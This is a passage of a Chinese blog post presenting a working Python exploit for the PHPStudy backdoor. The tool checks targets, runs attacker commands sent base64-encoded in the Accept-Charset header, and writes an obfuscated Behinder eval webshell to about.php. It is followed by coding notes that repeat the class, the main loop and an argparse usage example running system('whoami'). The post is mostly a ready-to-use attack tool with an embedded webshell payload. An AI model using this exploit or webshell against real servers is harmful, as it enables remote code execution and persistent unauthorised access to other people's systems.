class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_Target</span><span class="params">(self)</span>:</span></span><br><span class="line">        poc = &#123;</span><br><span class="line">            <span class="string">"Accept-Charset"</span>: <span class="string">"cGhwaW5mbygpOw=="</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            PocRequest = requests.get(self._url,headers=poc,timeout=TIME_OUT)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(PocRequest.content):</span><br><span class="line">                print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = self._command</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Command Execute Successful.'</span>)</span><br><span class="line">                print(response.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2018</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vUEhQVHV0b3JpYWwvV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2016</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            url = input(<span class="string">"Target url:\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'http://'</span> <span class="keyword">or</span> <span class="string">'https://'</span>) <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">                print(<span class="string">'[-] Please input target url with http or https'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Checking Target...'</span>)</span><br><span class="line">                x.url = url</span><br><span class="line">                <span class="keyword">if</span> x.check_Target():</span><br><span class="line">                    cmd = input(<span class="string">"Input Your Command:\n"</span>)</span><br><span class="line">                    command = base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    x.command = command</span><br><span class="line">                    x.exploit()</span><br><span class="line">                    print(<span class="string">'[-] upload a Behinder webshell'</span>)</span><br><span class="line">                    target = input(<span class="string">'Please choose the version for phpstudy [2018/2016]\n'</span>)</span><br><span class="line">                    <span class="keyword">if</span> target == <span class="string">'2018'</span>:</span><br><span class="line">                        x.upload_shell_2018()</span><br><span class="line">                    <span class="keyword">elif</span> target == <span class="string">'2016'</span>:</span><br><span class="line">                        x.upload_shell_2016()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞复现及php传shell"><a href="#漏洞复现及php传shell" class="headerlink" title="漏洞复现及php传shell"></a>漏洞复现及php传shell</h3><p><a href="http://www.lsowl.top/2019/09/28/PHP%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/#more">PHP文件写入</a></p>
+<p><a href="http://www.lsowl.top/2019/09/28/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more">phpstudy后门漏洞复现</a></p>
+<h3 id="代码编写总结"><a href="#代码编写总结" class="headerlink" title="代码编写总结"></a>代码编写总结</h3><blockquote>
+<p>记录一些忘了的点，想到哪说哪</p>
+</blockquote>
+<h4 id="关闭https警告"><a href="#关闭https警告" class="headerlink" title="关闭https警告"></a>关闭https警告</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br></pre></td></tr></table></figure>
+<h4 id="使用线程池"><a href="#使用线程池" class="headerlink" title="使用线程池"></a>使用线程池</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    files = input(<span class="string">'please input the files:\n'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(files,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.read().splitlines()  <span class="comment">#读取为一个列表</span></span><br><span class="line">            print(lines)</span><br><span class="line">            task_pool = threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line">            requests = threadpool.makeRequests(check,lines)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">            task_pool.putRequest(req)</span><br><span class="line">            task_pool.wait()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+<h4 id="requests请求后解析时自动判断编码问题"><a href="#requests请求后解析时自动判断编码问题" class="headerlink" title="requests请求后解析时自动判断编码问题"></a>requests请求后解析时自动判断编码问题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">自动判断编码后，使用requests.text有时候会乱码，直接一点，在返回解析时指定编码</span><br><span class="line"></span><br><span class="line">result.encoding = <span class="string">'gbk'</span></span><br></pre></td></tr></table></figure>
+<h4 id="面向对象编程（类）高级用法"><a href="#面向对象编程（类）高级用法" class="headerlink" title="面向对象编程（类）高级用法"></a>面向对象编程（类）高级用法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">为了保证安全性以及代码的健壮性，不直接定义私有变量，而是通过提示私有变量，通过装饰器来实现,并且使用object来继承，方便高级调用</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">初始化的时候带了了参数，所以在实例化的时候要带参数（脑子一抽风），懒得改了，直接在实例化的时候传两个空参数进去，后面再进行自己构造调用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)  <span class="comment">#空参数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            url = input(<span class="string">"Target url:\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'http://'</span> <span class="keyword">or</span> <span class="string">'https://'</span>) <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">                print(<span class="string">'[-] Please input target url with http or https'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Checking Target...'</span>)</span><br><span class="line">                x.url = url					<span class="comment">#具体调用</span></span><br><span class="line">                <span class="keyword">if</span> x.check_Target():</span><br><span class="line">                    cmd = input(<span class="string">"Input Your Command:\n"</span>)</span><br><span class="line">                    command = base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    x.command = command</span><br><span class="line">                    x.exploit()</span><br><span class="line">                    print(<span class="string">'[-] upload a Behinder webshell'</span>)</span><br><span class="line">                    target = input(<span class="string">'Please choose the version for phpstudy [2018/2016]\n'</span>)</span><br><span class="line">                    <span class="keyword">if</span> target == <span class="string">'2018'</span>:</span><br><span class="line">                        x.upload_shell_2018()</span><br><span class="line">                    <span class="keyword">elif</span> target == <span class="string">'2016'</span>:</span><br><span class="line">                        x.upload_shell_2016()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+<h4 id="argparse参数化解析编程"><a href="#argparse参数化解析编程" class="headerlink" title="argparse参数化解析编程"></a>argparse参数化解析编程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">定义description以及usage，为了防止在调用命令时出现的如反斜杠之类的参数被转义，使用单双引号等避免转义，略显麻烦</span><br><span class="line"></span><br><span class="line">parse = argparse.ArgumentParser(description=<span class="string">'EXP for phpstudy_backdoor.'</span>)</span><br><span class="line">    parse.usage=<span class="string">"""phpstudy_backdoor_getshell.py [-h] [-u URL] [-c ...]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       example: python3 phpstudy_backdoor_getshell.py -u http://192.168.1.103/index.php -c 'system(\\"whoami\\");'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       使用反斜杠和单双引号防止转义的问题，并解决argparse下以空格解析参数不能当做一个字符串的问题</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">在定义参数时，后面可能跟不止一个参数，尤其是执行系统命令，为了方便，不限定后面接的数量（nargs=argparse.REMAINDER）；同时使用解析参数的时候将后面跟的参数（以空格分开的）拼接成一个字符串</span><br><span class="line"></span><br><span class="line">parse.add_argument(<span class="string">'-c'</span>,<span class="string">'--command'</span>, nargs=argparse.REMAINDER,help=<span class="string">'Please input the exploit command'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.url <span class="keyword">and</span> args.command:</span><br><span class="line">            commands = <span class="string">''</span> </span><br><span class="line">            <span class="keyword">for</span> cmd <span class="keyword">in</span> args.command:</span><br><span class="line">                commands += cmd + <span class="string">' '</span></span><br><span class="line">            command = base64.b64encode(commands.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.command = command</span><br><span class="line">            x.exploit()</span><br></pre></td></tr></table></figure>
+<p>主要是一些细节上的点记不清了，特此记录一下</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://yzddmr6.tk/posts/phpstudy-backdoor/" target="_blank" rel="noopener">https://yzddmr6.tk/posts/phpstudy-backdoor/</a></p>
+<p><a href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/code/" rel="tag"><i class="fa fa-tag"></i> code</a>
+          
+            <a href="/tags/poc/" rel="tag"><i class="fa fa-tag"></i> poc</a>
+          
+            <a href="/tags/exp/" rel="tag"><i class="fa fa-tag"></i> exp</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/28/phpstudy后门漏洞复现/" rel="next" title="phpstudy后门漏洞复现">
+                <i class="fa fa-chevron-left"></i> phpstudy后门漏洞复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="Demos" />
+            
+              <p class="site-author-name" itemprop="name">Demos</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/demossl" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:demosqq@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
